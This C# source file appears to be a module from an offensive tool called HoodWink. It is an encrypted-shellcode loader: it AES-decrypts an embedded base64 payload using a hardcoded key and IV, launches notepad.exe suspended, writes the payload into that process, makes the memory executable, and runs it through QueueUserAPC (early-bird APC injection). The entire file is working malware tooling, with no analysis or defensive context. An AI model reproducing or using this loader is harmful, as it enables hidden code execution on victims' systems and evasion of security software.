// NOT Compiled

using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace HoodWink.ModuleSource
{
    class Spawn_QueueAPC
    {
        // to allocate mem
        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        // to run delegate as unmanaged code
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WindowsRun();

        public static void Main(string[] args)
        {
            string b64 = "S7SoQNzhzopgAy43qXppcgK747TYdbPn6K2TJBs8IzwUmKQJEYL9trSaTIpcZoSE3DvtewVQYw4rANJP5Q+A+dROo1qZoitVM1CSz0MY5iaTCyAErRb3KlDRk6CVA0x1FskF4PQ6ExV4sfbyCdTsTcFQePy9WZpFw+CeGkbuvep09e+MFLA62TxUWhcTAu5Ea/unoYNBM5MYp5VpXtXNbpn4vh+ZoJRNpKlP+2aZeQWwqV9ug79RKW6VG1RO/kVVKBKogVbY9nkdpXbD5prhZGgWUboOFi/WR/tXrGaxz8yAWO82nAuQKb8jWvTW+3cX6o3ZG187Sg1fb30e4PvtC+KscWOyXgVm+sIvWnDk5LgxOhRopYYpaJLel+qDeOey";
            string key = "fznj+qqPK3EB2cuSPSOWgCchNzGQX9Y7l+BdhDzuQEk=";
            string iv = "OSlpGb43/86qHsa4NQwwKA==";

            byte[] payload = Decrypt(b64, key, iv);

            var pa = new Util.Kernel32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new Util.Kernel32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var si = new Util.Kernel32.STARTUPINFO();

            if (!Util.Kernel32.CreateProcess(@"C:\Windows\System32\notepad.exe", null,
                ref pa, ref ta,
                false,
                Util.Kernel32.CreationFlags.CreateSuspended,
                IntPtr.Zero, @"C:\Windows\System32", ref si, out var pi))
            {
                return;
            }

            var baseAddress = Util.Kernel32.VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                payload.Length,
                Util.Kernel32.AllocationType.Commit | Util.Kernel32.AllocationType.Reserve,
                Util.Kernel32.MemoryProtection.ReadWrite);

            Util.Kernel32.WriteProcessMemory(
                pi.hProcess,
                baseAddress,
                payload,
                payload.Length,
                out _);

            Util.Kernel32.VirtualProtectEx(
                pi.hProcess,
                baseAddress,
                payload.Length,
                Util.Kernel32.MemoryProtection.ExecuteRead,
                out _);

            Util.Kernel32.QueueUserAPC(baseAddress, pi.hThread, 0);

            var result = Util.Kernel32.ResumeThread(pi.hThread);


        }


        private static byte[] Decrypt(string dataBase64, string keyBase64, string ivBase64)
        {
            using (Aes aes = Aes.Create())
            {
                // Decode data
                byte[] data = Convert.FromBase64String(dataBase64);

                // Set Key and IV
                aes.Key = Convert.FromBase64String(keyBase64);
                aes.IV = Convert.FromBase64String(ivBase64);

                // Console.WriteLine($"Aes Cipher Mode : {aes.Mode}");
                // Console.WriteLine($"Aes Padding Mode: {aes.Padding}");
                // Console.WriteLine($"Aes Key Size :    {aes.KeySize}");
                // Console.WriteLine($"Aes Block Size :  {aes.BlockSize}");
                // Console.WriteLine();

                // Create decrypter and run
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return DoCrypto(data, decryptor);
                }
            }
        }

        // Do Encryption/Decryption on data with provided crypter
        private static byte[] DoCrypto(byte[] data, ICryptoTransform crypter)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, crypter, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();

                    return ms.ToArray();
                }
            }
        }

    }
}